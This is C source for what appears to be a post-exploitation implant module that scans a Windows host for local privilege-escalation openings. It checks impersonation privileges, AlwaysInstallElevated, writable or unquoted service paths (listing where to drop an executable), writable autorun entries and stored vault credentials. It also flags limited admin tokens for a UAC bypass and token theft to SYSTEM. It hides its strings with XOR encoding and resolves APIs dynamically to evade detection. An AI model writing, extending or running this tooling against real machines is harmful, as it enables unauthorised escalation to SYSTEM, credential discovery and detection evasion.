#include "adv_lazy.h"
#include "evs_strings.h"
#include "peb_walk.h"
#include <windows.h>
#include <aclapi.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

typedef BOOL (WINAPI *fn_CredEnum_t)(LPCSTR, DWORD, DWORD *, void ***);
typedef VOID (WINAPI *fn_CredFree_t)(PVOID);

/* CREDENTIAL layout */
typedef struct {
    DWORD    Flags;
    DWORD    Type;
    LPSTR    TargetName;
    LPSTR    Comment;
    FILETIME LastWritten;
    DWORD    CredentialBlobSize;
    LPBYTE   CredentialBlob;
    DWORD    Persist;
    DWORD    AttributeCount;
    PVOID    Attributes;
    LPSTR    TargetAlias;
    LPSTR    UserName;
} CRED_A;

/* impersonation token required by AccessCheck */
static HANDLE _dup_imp(void)
{
    const adv_api_t *adv = adv_get();
    HANDLE h = NULL, hi = NULL;
    if (!adv->OpenProcessToken ||
        !adv->OpenProcessToken(GetCurrentProcess(), TOKEN_DUPLICATE|TOKEN_QUERY, &h))
        return NULL;
    SECURITY_ATTRIBUTES sa = {sizeof(sa)};
    if (adv->DuplicateTokenEx)
        adv->DuplicateTokenEx(h, TOKEN_ALL_ACCESS, &sa,
                              SecurityImpersonation, TokenImpersonation, &hi);
    CloseHandle(h);
    return hi;
}

/* returns 1 if current user can write to path (file or dir) */
static int _can_write(const char *path, HANDLE himp)
{
    if (!himp) return 0;
    PSECURITY_DESCRIPTOR pSD = NULL;
    DWORD err = GetNamedSecurityInfoA((LPSTR)path, SE_FILE_OBJECT,
        DACL_SECURITY_INFORMATION|OWNER_SECURITY_INFORMATION|GROUP_SECURITY_INFORMATION,
        NULL, NULL, NULL, NULL, &pSD);
    if (err != ERROR_SUCCESS) return 0;
    DWORD mask = FILE_WRITE_DATA | FILE_APPEND_DATA;
    GENERIC_MAPPING gm = {FILE_GENERIC_READ, FILE_GENERIC_WRITE,
                           FILE_GENERIC_EXECUTE, FILE_ALL_ACCESS};
    MapGenericMask(&mask, &gm);
    PRIVILEGE_SET ps; DWORD ps_sz = sizeof(ps);
    DWORD granted = 0; BOOL ok = FALSE;
    AccessCheck(pSD, himp, mask, &gm, &ps, &ps_sz, &granted, &ok);
    LocalFree(pSD);
    return ok ? 1 : 0;
}

/* append-safe snprintf wrapper */
#define APPF(buf, off, sz, ...) \
    do { int _n = snprintf((buf)+*(off), (sz)-*(off), __VA_ARGS__); \
         if (_n > 0) *(off) += (size_t)_n; } while(0)

/* ------------------------------------------------------------------ */
/* 1. SeImpersonatePrivilege                                           */
/* ------------------------------------------------------------------ */

static void _chk_seimpersonate(char *out, size_t *off, size_t sz)
{
    const adv_api_t *adv = adv_get();
    HANDLE h = NULL;
    if (!adv->OpenProcessToken ||
        !adv->OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &h)) return;
    DWORD need = 0;
    GetTokenInformation(h, TokenPrivileges, NULL, 0, &need);
    TOKEN_PRIVILEGES *tp = (TOKEN_PRIVILEGES *)malloc(need);
    if (!tp) { CloseHandle(h); return; }
    if (GetTokenInformation(h, TokenPrivileges, tp, need, &need)) {
        for (DWORD i = 0; i < tp->PrivilegeCount; i++) {
            char name[64] = {0}; DWORD nl = sizeof(name);
            if (adv->LookupPrivilegeNameA)
                adv->LookupPrivilegeNameA(NULL, &tp->Privileges[i].Luid, name, &nl);
            char _sp[24]; { volatile unsigned char _k = EVS_KEY;
              for (int _i = 0; _i < (int)sizeof(EVS_str_SeImpersonatePrivilege); _i++)
                  _sp[_i] = (char)(EVS_str_SeImpersonatePrivilege[_i] ^ _k);
              _sp[sizeof(EVS_str_SeImpersonatePrivilege)] = '\0'; }
            if (_stricmp(name, _sp) == 0) {
                BOOL en = (tp->Privileges[i].Attributes &
                           (SE_PRIVILEGE_ENABLED|SE_PRIVILEGE_ENABLED_BY_DEFAULT)) != 0;
                APPF(out, off, sz, "[SeImpersonate] %s%s\n",
                     en ? "ENABLED" : "present/disabled",
                     en ? " → gs (pipe impersonation)" : "");
                free(tp); CloseHandle(h); return;
            }
        }
    }
    free(tp); CloseHandle(h);
    APPF(out, off, sz, "[SeImpersonate] not held\n");
}

/* ------------------------------------------------------------------ */
/* 2. AlwaysInstallElevated                                            */
/* ------------------------------------------------------------------ */

static void _chk_aie(char *out, size_t *off, size_t sz)
{
    /* Decode registry path + value name from EVS to avoid plaintext in .rdata */
    volatile unsigned char _k = EVS_KEY;
    char _rp[52], _rv[22];
    for (int _i = 0; _i < (int)sizeof(EVS_str_reg_installer_policy); _i++)
        _rp[_i] = (char)(EVS_str_reg_installer_policy[_i] ^ _k);
    _rp[sizeof(EVS_str_reg_installer_policy)] = '\0';
    for (int _i = 0; _i < (int)sizeof(EVS_str_AlwaysInstallElevated); _i++)
        _rv[_i] = (char)(EVS_str_AlwaysInstallElevated[_i] ^ _k);
    _rv[sizeof(EVS_str_AlwaysInstallElevated)] = '\0';

    DWORD hklm = 0, hkcu = 0, cb = sizeof(DWORD);
    RegGetValueA(HKEY_LOCAL_MACHINE, _rp, _rv, RRF_RT_REG_DWORD, NULL, &hklm, &cb);
    cb = sizeof(DWORD);
    RegGetValueA(HKEY_CURRENT_USER,  _rp, _rv, RRF_RT_REG_DWORD, NULL, &hkcu, &cb);
    SecureZeroMemory(_rp, sizeof(_rp)); SecureZeroMemory(_rv, sizeof(_rv));

    if (hklm == 1 && hkcu == 1) {
        char _t1[] = {'[','A','I','E',']',' ','V','U','L','N','E','R','A','B','L','E',
                      ' ','(','H','K','L','M','+','H','K','C','U','=','1',')','\n',0};
        APPF(out, off, sz, "%s", _t1);
    } else
        APPF(out, off, sz, "[AIE] not set (HKLM=%lu HKCU=%lu)\n", hklm, hkcu);
}

/* ------------------------------------------------------------------ */
/* 3 & 4. Service checks (unquoted paths + writable binaries)          */
/* Opens SCM once, does both checks in one pass.                       */
/* ------------------------------------------------------------------ */

static void _extract_bin(const char *path, char *bin, size_t bin_sz)
{
    if (!path || !path[0]) { bin[0] = 0; return; }
    if (path[0] == '"') {
        const char *e = strchr(path + 1, '"');
        size_t l = e ? (size_t)(e - path - 1) : strlen(path + 1);
        if (l >= bin_sz) l = bin_sz - 1;
        strncpy(bin, path + 1, l); bin[l] = 0;
    } else {
        const char *sp = strchr(path, ' ');
        size_t l = sp ? (size_t)(sp - path) : strlen(path);
        if (l >= bin_sz) l = bin_sz - 1;
        strncpy(bin, path, l); bin[l] = 0;
    }
}

static void _chk_services(char *out, size_t *off, size_t sz, HANDLE himp)
{
    const adv_api_t *adv = adv_get();
    if (!adv->OpenSCManagerA || !adv->EnumServicesStatusExA ||
        !adv->OpenServiceA   || !adv->QueryServiceConfigA   ||
        !adv->CloseServiceHandle)
        return;

    SC_HANDLE scm = adv->OpenSCManagerA(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE);
    if (!scm) { APPF(out, off, sz, "[svc] SCM open failed: %lu\n", GetLastError()); return; }

    DWORD bytes = 0, count = 0, resume = 0;
    adv->EnumServicesStatusExA(scm, SC_ENUM_PROCESS_INFO, SERVICE_WIN32,
        SERVICE_STATE_ALL, NULL, 0, &bytes, &count, &resume, NULL);
    BYTE *buf = (BYTE *)malloc(bytes);
    if (!buf) { adv->CloseServiceHandle(scm); return; }

    int found_unq = 0, found_bin = 0;

    if (adv->EnumServicesStatusExA(scm, SC_ENUM_PROCESS_INFO, SERVICE_WIN32,
        SERVICE_STATE_ALL, buf, bytes, &bytes, &count, &resume, NULL))
    {
        ENUM_SERVICE_STATUS_PROCESS *svcs = (ENUM_SERVICE_STATUS_PROCESS *)buf;
        for (DWORD i = 0; i < count && *off < sz - 1; i++) {
            SC_HANDLE svc = adv->OpenServiceA(scm, svcs[i].lpServiceName,
                                              SERVICE_QUERY_CONFIG);
            if (!svc) continue;
            DWORD cfg_sz = 0;
            adv->QueryServiceConfigA(svc, NULL, 0, &cfg_sz);
            QUERY_SERVICE_CONFIGA *cfg = (QUERY_SERVICE_CONFIGA *)malloc(cfg_sz);
            if (!cfg) { adv->CloseServiceHandle(svc); continue; }

            if (adv->QueryServiceConfigA(svc, cfg, cfg_sz, &cfg_sz)) {
                const char *raw = cfg->lpBinaryPathName;
                if (raw && raw[0]) {
                    char bin[MAX_PATH] = {0};
                    _extract_bin(raw, bin, sizeof(bin));

                    /* check writable service binary */
                    if (bin[0] && GetFileAttributesA(bin) != INVALID_FILE_ATTRIBUTES
                        && _can_write(bin, himp)) {
                        const char *acct = cfg->lpServiceStartName
                                         ? cfg->lpServiceStartName : "?";
                        APPF(out, off, sz, "[svc-write] %s  account=%s\n  binary: %s\n",
                             svcs[i].lpServiceName, acct, bin);
                        found_bin = 1;
                    }

                    /* check unquoted path with spaces */
                    if (raw[0] != '"' && strchr(raw, ' ')) {
                        /* enumerate hijack candidates: split on spaces */
                        char work[MAX_PATH * 2];
                        strncpy(work, raw, sizeof(work) - 1);
                        work[sizeof(work) - 1] = 0;
                        char *p = work;
                        /* skip past first token that has no space (e.g. "C:\") */
                        while (*p) {
                            char *sp = strchr(p, ' ');
                            if (!sp) break;
                            *sp = 0; /* temp null at space */
                            /* candidate exe = work + ".exe" */
                            char cand[MAX_PATH + 4];
                            snprintf(cand, sizeof(cand), "%s.exe", work);
                            /* check parent dir writable (to drop the exe) */
                            char parent[MAX_PATH];
                            strncpy(parent, work, sizeof(parent) - 1);
                            char *sl = strrchr(parent, '\\');
                            if (sl) { *sl = 0;
                                if (GetFileAttributesA(parent) != INVALID_FILE_ATTRIBUTES
                                    && _can_write(parent, himp)) {
                                    APPF(out, off, sz,
                                        "[unquoted] %s\n  drop: %s\n  dir writable: %s\n",
                                        svcs[i].lpServiceName, cand, parent);
                                    found_unq = 1;
                                }
                            }
                            *sp = ' '; /* restore */
                            p = sp + 1;
                        }
                    }
                }
            }
            free(cfg);
            adv->CloseServiceHandle(svc);
        }
    }
    free(buf);
    adv->CloseServiceHandle(scm);

    if (!found_bin) APPF(out, off, sz, "[svc-write] none writable\n");
    if (!found_unq) APPF(out, off, sz, "[unquoted]  none exploitable\n");
}

/* ------------------------------------------------------------------ */
/* 5. Writable autorun paths (HKLM/HKCU Run keys)                     */
/* ------------------------------------------------------------------ */

static void _chk_autoruns(char *out, size_t *off, size_t sz, HANDLE himp)
{
    static const char *keys[] = {
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
        "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run",
        NULL
    };
    HKEY roots[2] = { HKEY_LOCAL_MACHINE, HKEY_CURRENT_USER };
    const char *rnames[2] = { "HKLM", "HKCU" };
    int found = 0;

    for (int r = 0; r < 2; r++) {
        for (int k = 0; keys[k] && *off < sz - 1; k++) {
            HKEY hk = NULL;
            if (RegOpenKeyExA(roots[r], keys[k], 0, KEY_READ, &hk) != ERROR_SUCCESS)
                continue;
            DWORD idx = 0;
            char vname[256], vdata[1024];
            DWORD vn, vd, vtype;
            while (1) {
                vn = sizeof(vname); vd = sizeof(vdata);
                if (RegEnumValueA(hk, idx++, vname, &vn, NULL,
                                  &vtype, (LPBYTE)vdata, &vd) != ERROR_SUCCESS) break;
                if (vtype != REG_SZ && vtype != REG_EXPAND_SZ) continue;
                char bin[MAX_PATH] = {0};
                _extract_bin(vdata, bin, sizeof(bin));
                if (bin[0] && GetFileAttributesA(bin) != INVALID_FILE_ATTRIBUTES
                    && _can_write(bin, himp)) {
                    /* HKCU = persistence only (runs as current user)
                       HKLM = LPE vector (runs at system startup / all users) */
                    const char *tag = (r == 0) ? "[autorun-lpe]" : "[autorun-persist]";
                    APPF(out, off, sz, "%s %s\\%s → %s: %s\n",
                         tag, rnames[r], keys[k], vname, bin);
                    found = 1;
                }
            }
            RegCloseKey(hk);
        }
    }
    if (!found) APPF(out, off, sz, "[autorun]  none writable\n");
}

/* ------------------------------------------------------------------ */
/* 6. Stored credentials (CredEnumerate — fully dynamic)               */
/* ------------------------------------------------------------------ */

static void _chk_creds(char *out, size_t *off, size_t sz)
{
    char _da[13];
    EVS_D(_da, EVS_dll_advapi32);
    HMODULE had = _peb_module(_da);
    SecureZeroMemory(_da, sizeof(_da));
    if (!had) return;
    char s_ce[15], s_cf[9];
    EVS_D(s_ce, EVS_fn_CredEnumerateA);
    EVS_D(s_cf, EVS_fn_CredFree);
    fn_CredEnum_t pCE = (fn_CredEnum_t)(void*)GetProcAddress(had, s_ce);
    SecureZeroMemory(s_ce, sizeof(s_ce));
    fn_CredFree_t pCF = (fn_CredFree_t)(void*)GetProcAddress(had, s_cf);
    SecureZeroMemory(s_cf, sizeof(s_cf));
    if (!pCE || !pCF) return;

    DWORD count = 0; CRED_A **creds = NULL;
    if (!pCE(NULL, 0, &count, (void***)&creds)) {
        APPF(out, off, sz, "[creds]    none (or access denied)\n");
        return;
    }
    if (count == 0) {
        APPF(out, off, sz, "[creds]    vault empty\n");
    } else {
        APPF(out, off, sz, "[creds]    %lu entry/entries:\n", count);
        for (DWORD i = 0; i < count && *off < sz - 1; i++) {
            CRED_A *c = creds[i];
            /* type 1=generic 2=domain_password 3=domain_cert */
            APPF(out, off, sz, "  [%lu] target=%-40s user=%s blob=%lu bytes\n",
                 c->Type,
                 c->TargetName ? c->TargetName : "(null)",
                 c->UserName   ? c->UserName   : "(null)",
                 c->CredentialBlobSize);
        }
    }
    pCF(creds);
}

/* ------------------------------------------------------------------ */
/* 0. UAC limited-admin token detection                                */
/* TokenElevationTypeLimited = user is local admin running filtered    */
/* medium-IL token → UAC bypass + token steal → SYSTEM possible.      */
/* ------------------------------------------------------------------ */

static void _chk_uac_limited(char *out, size_t *off, size_t sz)
{
    HANDLE htok = NULL;
    { const adv_api_t *_a = adv_get();
      if (!_a->OpenProcessToken || !_a->OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &htok)) return; }

    TOKEN_ELEVATION_TYPE etype = TokenElevationTypeDefault;
    DWORD cb = sizeof(etype);
    GetTokenInformation(htok, TokenElevationType, &etype, cb, &cb);

    /* Integrity level */
    DWORD need = 0;
    GetTokenInformation(htok, TokenIntegrityLevel, NULL, 0, &need);
    TOKEN_MANDATORY_LABEL *tml = (TOKEN_MANDATORY_LABEL *)malloc(need);
    DWORD il_rid = 0;
    if (tml && GetTokenInformation(htok, TokenIntegrityLevel, tml, need, &need))
        il_rid = *GetSidSubAuthority(tml->Label.Sid,
                     *GetSidSubAuthorityCount(tml->Label.Sid) - 1);
    free(tml);
    CloseHandle(htok);

    const char *il_str = il_rid >= 0x4000 ? "SYSTEM"
                       : il_rid >= 0x3000 ? "HIGH"
                       : il_rid >= 0x2000 ? "MEDIUM"
                       : il_rid >= 0x1000 ? "LOW"
                       : "UNTRUSTED";

    if (etype == TokenElevationTypeLimited) {
        APPF(out, off, sz,
            "[UAC] VULNERABLE - limited admin token (IL=%s)\n"
            "  → run: pe  (UAC bypass + token steal → SYSTEM)\n"
            "  methods: COM moniker / fodhelper / sdclt (auto-fallback)\n",
            il_str);
    } else if (etype == TokenElevationTypeFull) {
        APPF(out, off, sz,
            "[UAC] already elevated (IL=%s) → run: gs\n", il_str);
    } else {
        APPF(out, off, sz,
            "[UAC] default token (IL=%s) - not local admin, UAC bypass unavailable\n",
            il_str);
    }
}

/* ------------------------------------------------------------------ */
/* Entry point                                                          */
/* ------------------------------------------------------------------ */

int cmd_lpe_check(const char *args, char *out, size_t sz)
{
    (void)args;
    memset(out, 0, sz);
    size_t off = 0;

    APPF(out, &off, sz, "=== LPE CHECK ===\n");

    HANDLE himp = _dup_imp();

    _chk_uac_limited(out, &off, sz);
    _chk_seimpersonate(out, &off, sz);
    _chk_aie(out, &off, sz);
    _chk_services(out, &off, sz, himp);
    _chk_autoruns(out, &off, sz, himp);
    _chk_creds(out, &off, sz);

    if (himp) CloseHandle(himp);
    return 0;
}
